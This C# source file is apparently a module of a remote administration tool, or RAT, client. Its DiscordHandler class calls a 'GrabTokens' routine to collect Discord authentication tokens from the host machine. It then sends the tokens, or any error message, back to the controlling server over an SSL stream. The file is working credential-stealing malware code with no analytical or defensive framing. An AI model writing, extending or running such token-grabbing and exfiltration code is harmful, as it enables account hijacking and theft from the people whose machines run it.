using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Text;
using System.Threading.Tasks;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Client.Modules
{
    internal class DiscordHandler
    {
        public static async Task HandleTokenRequest(SslStream stream)
        {
            try
            {
                string tokens = Recovery.Discord.Discord.GrabTokens();
                Console.WriteLine(tokens);

                // Send the tokens back to the server
                var response = new TokenResponseMessage
                {
                    Tokens = tokens,
                    Success = !string.IsNullOrEmpty(tokens)
                };

                await NetworkHelper.SendMessageAsync(stream, response);
                Console.WriteLine("Sent Discord tokens to server");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling token request: {ex.Message}");

                // Send error response
                var errorResponse = new TokenResponseMessage
                {
                    Tokens = string.Empty,
                    Success = false,
                    ErrorMessage = ex.Message
                };

                await NetworkHelper.SendMessageAsync(stream, errorResponse);
            }
        }
    }
}